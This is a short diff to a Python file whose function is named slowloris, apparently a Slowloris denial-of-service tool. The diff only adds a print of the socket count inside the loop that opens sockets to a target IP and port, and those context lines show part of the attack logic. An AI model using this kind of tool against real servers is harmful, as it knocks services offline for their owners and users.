@@ -22,6 +22,7 @@ def slowloris(IP, port, socket_count):
                 try:
                     s = create_socket(IP, port)
                     sockets.append(s)
+                    print(len(sockets))
                 except:
                     print("socket could not be established")
                     break
